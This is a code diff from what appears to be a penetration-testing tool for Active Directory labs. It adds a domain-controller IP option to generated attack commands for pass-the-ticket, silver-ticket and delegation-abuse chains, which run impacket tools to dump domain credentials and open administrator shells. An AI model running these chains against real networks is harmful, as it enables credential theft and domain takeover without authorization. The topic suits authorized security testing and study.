@@ -588,10 +588,12 @@ def run(report, store, ui=None):
         s, l = e.ccache_src
         _dom_r26 = store.dominant_domain() or "<dom>"
         _dc_fqdn_r26 = store.dc_fqdn() or "<DC-FQDN>"
+        _dc_ip_r26 = store.dc_ip() or "<DC-IP>"
         chains.append(Chain("R26", "pass-the-ticket", "Kerberos ticket present",
             crit=6, conf=0.8, ready=1.4, prox=0.8,
             commands=[f"export KRB5CCNAME=<ticket.ccache>; "
-                      f"impacket-secretsdump -k -no-pass {_dom_r26}/<user>@{_dc_fqdn_r26}   "
+                      f"impacket-secretsdump -k -no-pass -dc-ip {_dc_ip_r26} "
+                      f"{_dom_r26}/<user>@{_dc_fqdn_r26}   "
                       f"# Kerberos: hostname MUST be the DC FQDN (SPN in ticket), not the IP {dc()}"],
             src=s, line=l))
     # shadow
@@ -634,7 +636,9 @@ def run(report, store, ui=None):
                     f"-domain {_dom_sv} -spn cifs/{host_short}.{_dom_sv} "
                     f"Administrator{_sid_note_sv}",
                     f"export KRB5CCNAME=Administrator.ccache",
-                    f"impacket-psexec -k -no-pass {_dom_sv}/Administrator@{host_short}.{_dom_sv}",
+                    # iter-62: -dc-ip anchor for KDC discovery on lab boxes
+                    f"impacket-psexec -k -no-pass -dc-ip {_dc_sv} "
+                    f"{_dom_sv}/Administrator@{host_short}.{_dom_sv}",
                 ], src=hsrc, line=hln))
             break
 
@@ -901,10 +905,11 @@ def run(report, store, ui=None):
                             f"impacket-rbcd -delegate-from 'attacker$' "
                             f"-delegate-to '{host_short}$' -action write "
                             f"'{_dom_e}/{_owned}:{_owned_pw}'",
-                            f"impacket-getST -spn 'cifs/{fqdn}' "
+                            f"impacket-getST -spn 'cifs/{fqdn}' -dc-ip {_dc_e} "
                             f"-impersonate administrator '{_dom_e}/attacker$:P@ssw0rd!'",
                             f"export KRB5CCNAME=administrator.ccache; "
-                            f"impacket-secretsdump -k -no-pass '{_dom_e}/administrator@{fqdn}'",
+                            f"impacket-secretsdump -k -no-pass -dc-ip {_dc_e} "
+                            f"'{_dom_e}/administrator@{fqdn}'",
                         ], src=edge["src"], line=edge["line"]))
                 else:
                     chains.append(Chain("R-WRITEDACL", "force-change-password via writeable user",
